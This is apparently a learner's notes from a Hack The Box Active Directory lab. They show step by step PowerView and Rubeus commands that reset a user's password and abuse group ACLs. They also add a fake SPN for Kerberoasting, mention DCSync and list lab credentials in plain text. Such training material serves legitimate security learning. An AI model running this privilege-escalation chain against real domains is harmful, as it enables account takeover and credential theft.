- We have control over the user `wley` whose hash we retrieved earlier in the module (assessment) using Responder and cracked offline using Hashcat to reveal the cleartext password value
- We enumerated objects that the user `wley` has control over and found that we could force change the password of the user `damundsen`
- From here, we found that the `damundsen` user can add a member to the `Help Desk Level 1` group using `GenericWrite` privileges
- The `Help Desk Level 1` group is nested into the `Information Technology` group, which grants members of that group any rights provisioned to the `Information Technology` group


`Get-DomainObjectACL` shows us that members of the `Information Technology` group have `GenericAll` rights over the user `adunn`, which means we could:

- Modify group membership
- Force change a password
- Perform a targeted Kerberoasting attack and attempt to crack the user's password if it is weak


`adunn` user has `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-In-Filtered-Set` rights over the domain objec

----

#### Creating a PSCredential Object
wley` has control over  force change the password of the user `damundsen
wley <> transporter@4
```powershell-session
PS C:\htb> $SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force

PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
```

#### Creating a SecureString Object
represents the password we want to set for the target user `damundsen`.
```powershell-session
PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

#### Changing the User's Password
```powershell-session
PS C:\htb> cd C:\Tools\
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```


#### Creating a SecureString Object using damundsen
add ourselves to the `Help Desk Level 1` group.
authenticate as the `damundsen` user and add ourselves to the `Help Desk Level 1` group.

```powershell-session
PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
```

#### Adding damundsen to the Help Desk Level 1 Group
check memebrs?
```powershell-session
PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
```

```powershell-session
PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
```

#### Confirming damundsen was Added to the Group
```python
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
MemberName
----------
busucher
spergazed
damundsen
dpayne
```

---
#### check list
```python
1- damundsen is part of help desk 1 group netsed to `Information Technology`

2- member of 'info tech' group can take over use 'adunn' == '`GenericAll`' PRIV

3- 'adun' is admin we cant change his password , 

4- lets assing spn to user 'adunn' > then perform 'kerbrousting' attack to gain SPN ticket which is encrypted with addun password hash] via 'GenericAll`' PRIV'

```

#### Creating a Fake SPN VIA `GenericAll` PRIV
$CRED2 == damundsen
```powershell-session
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```
#### Kerberoasting with Rubeus
```powershell-session
PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap
```
```powershell-session
[*] ServicePrincipalName   : notahacker/LEGIT
```
```powershell-session
[*] Hash                   : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$ <SNIP>
```

crack the password offline using Hashcat > authenticate as the `adunn` user and perform the DCSync attack.

---


## Cleanup
In terms of cleanup, there are a few things we need to do:

1. Remove the fake SPN we created on the `adunn` user.
2. Remove the `damundsen` user from the `Help Desk Level 1` group
3. Set the password for the `damundsen` user back to its original value (if we know it) or have our client set it/alert the user

This order is important because if we remove the user from the group first, then we won't have the rights to remove the fake SPN.



DCSync attack

# adunn hash
SyncMaster757
adunn